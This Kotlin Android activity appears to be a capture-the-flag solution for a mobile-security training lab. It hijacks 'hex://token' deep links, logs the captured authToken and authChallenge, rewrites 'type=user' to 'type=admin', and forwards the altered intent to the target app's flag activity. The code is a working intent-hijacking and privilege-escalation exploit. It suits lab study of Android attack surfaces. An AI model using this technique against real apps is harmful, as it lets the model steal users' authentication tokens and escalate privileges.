package com.example.myapplication

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity

class DeepLinkActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        setContentView(R.layout.activity_deep_link)

        val incoming = intent

        if (
            incoming.action == Intent.ACTION_VIEW &&
            incoming.data?.scheme == "hex" &&
            incoming.data?.host == "token"
        ) {

            val data = incoming.data

            Log.d("HIJACK", "Original URI = $data")
            Log.d(
                "HIJACK",
                "type = ${data?.getQueryParameter("type")}"
            )
            Log.d(
                "HIJACK",
                "authToken = ${data?.getQueryParameter("authToken")}"
            )
            Log.d(
                "HIJACK",
                "authChallenge = ${data?.getQueryParameter("authChallenge")}"
            )

            // Create a new Intent
            val newIntent = Intent()

            // Copy relevant parts from the incoming Intent
            newIntent.fillIn(
                incoming,
                Intent.FILL_IN_DATA or
                        Intent.FILL_IN_ACTION or
                        Intent.FILL_IN_CATEGORIES
            )

            // Change user -> admin
            val newData = data
                ?.toString()
                ?.replace("type=user", "type=admin")

            if (newData != null) {
                newIntent.data = Uri.parse(newData)
            }

            // Explicitly send it to Flag14Activity
            newIntent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag14Activity"
            )

            Log.d("HIJACK", "Modified URI = ${newIntent.data}")

            // Forward the modified Intent
            startActivity(newIntent)

            // Close our Activity
            finish()
        }
    }
}